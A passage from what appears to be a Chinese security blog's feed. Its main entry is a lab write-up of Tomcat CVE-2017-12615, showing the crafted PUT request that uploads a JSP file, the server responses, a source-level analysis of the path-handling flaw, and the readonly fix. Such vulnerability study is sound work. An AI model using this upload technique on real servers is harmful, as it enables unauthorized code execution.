attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>site-name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>avatar<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;_res.title&#125;<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;rurl&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>$&#123;_res.title&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>slogan<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>$&#123;website.title&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>${website.title} 这种写法也没有做转义，也成为了触发 XSS 的一环。</p><blockquote><p>原文链接：</p><p><a href="https://www.teamssix.com/211220-164519.html">https://www.teamssix.com/211220-164519.html</a></p><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-反射型-XSS&quot;&gt;&lt;a href=&quot;#0x01-反射型-XSS&quot; class=&quot;headerlink&quot; title=&quot;0x01 反射型 XSS&quot;&gt;&lt;/a&gt;0x01 反射型 XSS&lt;/h1&gt;&lt;p&gt;以下代码展示了反射型 XSS 漏洞产生的大概形式&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="代码审计" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="代码审计" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>【代码审计】Tomcat 任意文件写入 CVE-2017-12615</title>
    <link href="https://www.teamssix.com/211216-172616.html"/>
    <id>https://www.teamssix.com/211216-172616.html</id>
    <published>2021-12-16T09:26:16.000Z</published>
    <updated>2021-12-16T09:38:29.370Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-环境搭建"><a href="#0x00-环境搭建" class="headerlink" title="0x00 环境搭建"></a>0x00 环境搭建</h1><p>直接 Docker 搭建即可</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/vulhub/vulhub.git<span class="token builtin class-name">cd</span> /vulhub/tomcat/CVE-2017-12615<span class="token function">sudo</span> docker-compose build<span class="token function">sudo</span> docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h1><p>直接使用 PUT 发起请求就可以上传任意文件，比如向 /teamssix.jsp/ 发起请求</p><pre class="line-numbers language-none"><code class="language-none">PUT &#x2F;teamssix.jsp&#x2F; HTTP&#x2F;1.1Host: 172.16.214.20:8080DNT: 1Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;95.0.4638.54 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Connection: closeContent-Length: 26&lt;%out.print(&quot;TeamsSix&quot;);%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">HTTP&#x2F;1.1 201 Content-Length: 0Date: Wed, 15 Dec 2021 07:19:29 GMTConnection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>服务端返回 201 说明创建成功，访问 /teamssix.jsp 可以看到文件成功被上传</p><pre class="line-numbers language-none"><code class="language-none">GET &#x2F;teamssix.jsp HTTP&#x2F;1.1Host: 172.16.214.20:8080DNT: 1Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;95.0.4638.54 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">HTTP&#x2F;1.1 200 Set-Cookie: JSESSIONID&#x3D;128419889W27F6C930EF27082B98D9FD; Path&#x3D;&#x2F;; HttpOnlyContent-Type: text&#x2F;html;charset&#x3D;ISO-8859-1Content-Length: 8Date: Wed, 15 Dec 2021 07:19:35 GMTConnection: closeTeamsSix<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112161721745.png"></p><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>Tomcat 在处理时有两个默认的 Servlet，分别为 DefaultServlet 和 JspServlet，具体配置如下：</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>default<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>org.apache.catalina.servlets.DefaultServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>debug<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>listings<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>readonly<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>load-on-startup</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>load-on-startup</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>…… <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>org.apache.jasper.servlet.JspServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>fork<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>xpoweredBy<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>load-on-startup</span><span class="token punctuation">></span></span>3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>load-on-startup</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>……    <span class="token comment">&lt;!-- The mapping for the default servlet --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>default<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- The mappings for the JSP servlet --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>*.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>*.jspx<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从配置文件里可以看到对于后缀为 .jsp 和 .jspx 的请求由 JspServlet 处理，而其他的请求则由 DefaultServlet 处理。</p><p>所以当请求 /teamssix.jsp 时将会由 JspServlet 处理，无法触发漏洞；而请求 /teamssix.jsp/ 将绕过这个限制，交由 DefaultServlet 处理，这时就可以触发漏洞了。</p><p>要想实现一个 Servlet，就需要继承 HTTPServlet，找到 HTTPServlet 文件为 /tomcat/lib/servlet-api.jar!/javax/servlet/http/HttpServlet.class</p><p>在 HTTPServlet 中找到 doPut 方法，然后找到 DefaultServlet 里重写的 doPut 方法路径为tomcat/lib/catalina.jar!/org/apache/catalina/servlets/DefaultServlet.class</p><p>查看 DefaultServlet 的 doPut 方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPut</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>readOnly<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        resp<span class="token punctuation">.</span><span class="token function">sendError</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> path <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getRelativePath</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">WebResource</span> resource <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>resources<span class="token punctuation">.</span><span class="token function">getResource</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">DefaultServlet<span class="token punctuation">.</span>Range</span> range <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">parseContentRange</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> resp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Object</span> resourceInputStream <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>range <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">File</span> contentFile <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">executePartialPut</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> range<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span>                resourceInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>contentFile<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                resourceInputStream <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>resources<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">InputStream</span><span class="token punctuation">)</span>resourceInputStream<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>resource<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    resp<span class="token punctuation">.</span><span class="token function">setStatus</span><span class="token punctuation">(</span><span class="token number">204</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    resp<span class="token punctuation">.</span><span class="token function">setStatus</span><span class="token punctuation">(</span><span class="token number">201</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                resp<span class="token punctuation">.</span><span class="token function">sendError</span><span class="token punctuation">(</span><span class="token number">409</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>resourceInputStream <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">InputStream</span><span class="token punctuation">)</span>resourceInputStream<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var13<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从上面代码的第 2 行可以看到首先判断 readOnly 是否为真，如果为真则返回 403，因此可以直接把 web.xml 里的 DefaultServlet 的 readonly 由原来的 false 改为 true 就能防御这个漏洞了。</p><p>继续回到 DefaultServlet.class 里，在 DefaultServlet.class 里可以看到有个 write 函数，通过这个 write 函数代码跟踪到 tomcat/lib/catalina.jar!/org/apache/catalina/webresources/DirResourceSet.class 里的 write 函数</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token class-name">String</span> path<span class="token punctuation">,</span> <span class="token class-name">InputStream</span> is<span class="token punctuation">,</span> <span class="token keyword">boolean</span> overwrite<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">checkPath</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>is <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">NullPointerException</span><span class="token punctuation">(</span>sm<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"dirResourceSet.writeNpe"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isReadOnly</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">File</span> dest <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> webAppMount <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getWebAppMount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>webAppMount<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            dest <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">file</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>webAppMount<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>dest <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>dest<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>overwrite<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>overwrite<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>is<span class="token punctuation">,</span> dest<span class="token punctuation">.</span><span class="token function">toPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">CopyOption</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">StandardCopyOption</span><span class="token punctuation">.</span>REPLACE_EXISTING<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                        <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>is<span class="token punctuation">,</span> dest<span class="token punctuation">.</span><span class="token function">toPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">CopyOption</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var7<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在执行到<code>dest = this.file(path.substring(webAppMount.length()), false); </code> 时，path 会作为参数传入，执行 file 方法，file 方法部分代码如下</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token class-name">File</span> <span class="token function">file</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">boolean</span> mustExist<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        name <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">File</span> file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>fileBase<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在执行到 <code>File file = new File(this.fileBase, name); </code>时，会实例化一个 File 对象，fileBase 是 Web 应用所在的绝对路径。</p><p>这里的 name 就是传入的文件名，比如 /teamssix.jsp/，在 File 实例化的过程中会处理掉 /，因此 /teamssix.jsp/ 会变成  /teamssix.jsp</p><p>所以通过 PUT 请求，利用 /teamssix.jsp/ 可以达到任意文件上传的目的。</p><blockquote><p>参考文章：</p><p><a href="https://xz.aliyun.com/t/5610">https://xz.aliyun.com/t/5610</a></p><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-环境搭建&quot;&gt;&lt;a href=&quot;#0x00-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;0x00 环境搭建&quot;&gt;&lt;/a&gt;0x00 环境搭建&lt;/h1&gt;&lt;p&gt;直接 Docker 搭建即可&lt;/p&gt;
&lt;pre class=&quot;line-number</summary>
      
    
    
    
    <category term="代码审计" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="代码审计" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>【代码审计】敏感信息泄露</title>
    <link href="https://www.teamssix.com/211215-131111.html"/>
    <id>https://www.teamssix.com/211215-131111.html</id>
    <published>2021-12-15T05:11:11.000Z</published>
    <updated>2021-12-15T05:57:22.590Z</updated>
    
